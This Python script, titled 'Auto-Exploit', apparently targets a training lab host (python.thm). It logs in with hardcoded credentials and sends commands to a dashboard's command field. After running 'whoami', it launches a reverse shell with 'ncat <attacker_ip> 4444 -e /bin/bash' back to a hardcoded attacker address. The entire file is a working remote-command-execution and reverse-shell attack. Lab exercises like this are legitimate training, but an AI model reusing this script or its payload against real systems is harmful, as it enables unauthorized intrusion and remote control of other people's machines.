#!/usr/bin/python3

import requests
from colorama import Fore
import pyfiglet 

font = pyfiglet.figlet_format('Auto-Exploit')
print(Fore.CYAN+font)

login_url = "http://python.thm/labs/lab4/login.php"
execute_url = "http://python.thm/labs/lab4/dashboard.php"
username = "admin"
password = "password123"
attacker_ip = "10.21.169.208"
attacker_port = "4444"

def authenticate():
	session = requests.Session()
	response = session.post(login_url, data={'username':username, 'password':password})

	if "Welcome" in response.text:
		print("[+] Authentication successful.")
		return session
	return None
	
def execute_command(session, command):
	response = session.post(execute_url, data={"cmd": command})
	
	if "Session expired" in response.text:
		print("[-] Session expired! Re-authenticating...")
		session = authenticate()
		
	print(f"[+] Output:\n{response.text}")
	
def get_reverse_shell(session, attacker_ip, attacker_port):
	payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"
	execute_command(session, payload)
	
session = authenticate()
if session:
	execute_command(session, "whoami")
	get_reverse_shell(session, attacker_ip, attacker_port)